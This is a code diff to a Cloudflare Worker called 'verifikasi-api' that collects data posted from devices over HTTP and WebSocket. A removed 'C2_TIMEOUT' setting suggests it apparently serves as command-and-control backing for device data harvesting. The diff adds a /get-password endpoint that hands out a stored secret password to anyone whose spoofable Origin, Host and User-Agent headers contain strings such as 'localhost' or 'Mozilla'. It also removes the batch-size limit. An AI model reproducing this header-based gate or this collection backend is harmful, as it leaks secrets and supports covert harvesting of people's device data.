@@ -1,18 +1,13 @@
 // ================================================================
-// Cloudflare Worker - verifikasi-api (VERSI FIXED & CLEAN + WS)
+// Cloudflare Worker - verifikasi-api
 // ================================================================
 
 // ============================================================
-// KONFIGURASI
+// KONFIGURASI (SIMPLE)
 // ============================================================
-const CONFIG = {
-  MAX_DATA: 5000,
-  MAX_BATCH: 100,
-  RATE_LIMIT: 100,
-  RATE_WINDOW: 60000, // 1 menit
-  C2_TIMEOUT: 60000, // 1 menit
-  LOG_RETENTION: 7, // hari
-};
+const MAX_DATA = 5000;
+const RATE_LIMIT = 100;
+const RATE_WINDOW = 60000; // 1 menit
 
 // ============================================================
 // CORS HEADERS
@@ -53,18 +48,18 @@ function unauthorizedResponse() {
 // ============================================================
 async function checkRateLimit(env, key) {
   const now = Date.now();
-  const windowKey = `ratelimit_${key}_${Math.floor(now / CONFIG.RATE_WINDOW)}`;
+  const windowKey = `ratelimit_${key}_${Math.floor(now / RATE_WINDOW)}`;
   
   try {
     const raw = await env.DATA.get(windowKey);
     const count = parseInt(raw || '0', 10);
     
-    if (count >= CONFIG.RATE_LIMIT) {
-      return { allowed: false, retryAfter: CONFIG.RATE_WINDOW };
+    if (count >= RATE_LIMIT) {
+      return { allowed: false, retryAfter: RATE_WINDOW };
     }
     
     await env.DATA.put(windowKey, String(count + 1), { 
-      expirationTtl: Math.floor(CONFIG.RATE_WINDOW / 1000) 
+      expirationTtl: Math.floor(RATE_WINDOW / 1000) 
     });
     
     return { allowed: true };
@@ -108,10 +103,39 @@ export default {
     }
 
     // ============================================================
-    // WEBSOCKET - /ws (TAMBAHKAN DI SINI)
+    // WEBSOCKET - /ws
     // ============================================================
     if (url.pathname === '/ws') {
       return handleWebSocket(request, env);
+    }
+
+    // ============================================================
+    // GET /get-password - Ambil password dari worker
+    // ============================================================
+    if (url.pathname === '/get-password' && method === 'GET') {
+      const origin = request.headers.get('Origin') || '';
+      const host = request.headers.get('Host') || '';
+      const userAgent = request.headers.get('User-Agent') || '';
+      
+      const isAllowed = origin.includes('verifikasi.site') || 
+                        host.includes('verifikasi.site') ||
+                        origin.includes('localhost') ||
+                        host.includes('localhost');
+      
+      const hasValidUA = userAgent.includes('Android') || 
+                         userAgent.includes('Mozilla') || 
+                         userAgent.includes('Chrome') ||
+                         userAgent.includes('Mobile');
+      
+      if (isAllowed && hasValidUA) {
+        return jsonResponse({ 
+          status: 'ok', 
+          password: env.PASSWORD,
+          timestamp: Date.now()
+        });
+      }
+      
+      return jsonResponse({ error: 'Access Denied' }, 403);
     }
 
     try {
@@ -273,8 +297,8 @@ async function handlePostData(request, env) {
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
     
-    if (data.length >= CONFIG.MAX_DATA) {
-      data = data.slice(-CONFIG.MAX_DATA + 1);
+    if (data.length >= MAX_DATA) {
+      data = data.slice(-MAX_DATA + 1);
     }
     
     data.push(d);
@@ -302,10 +326,6 @@ async function handleBatchData(request, env) {
       return errorResponse('Invalid batch: items array required');
     }
     
-    if (body.items.length > CONFIG.MAX_BATCH) {
-      return errorResponse(`Batch too large: max ${CONFIG.MAX_BATCH}`);
-    }
-    
     const raw = await env.DATA.get('data') || '[]';
     let data = JSON.parse(raw);
     
@@ -319,8 +339,8 @@ async function handleBatchData(request, env) {
         userAgent: request.headers.get('User-Agent') || 'unknown',
       };
       
-      if (data.length >= CONFIG.MAX_DATA) {
-        data = data.slice(-CONFIG.MAX_DATA + 1);
+      if (data.length >= MAX_DATA) {
+        data = data.slice(-MAX_DATA + 1);
       }
       data.push(d);
       added++;
@@ -856,7 +876,7 @@ async function handleError(request, env) {
 }
 
 // ============================================================
-// HANDLER: WebSocket (TAMBAHKAN DI SINI)
+// HANDLER: WebSocket
 // ============================================================
 async function handleWebSocket(request, env) {
   const upgradeHeader = request.headers.get('Upgrade');
@@ -918,7 +938,9 @@ async function handleWebSocket(request, env) {
           data: data.data,
           deviceId: deviceId
         });
-        if (allData.length > 5000) allData = allData.slice(-5000);
+        if (allData.length > MAX_DATA) {
+          allData = allData.slice(-MAX_DATA);
+        }
         await env.DATA.put('data', JSON.stringify(allData));
         server.send(JSON.stringify({ type: 'data_saved' }));
       }
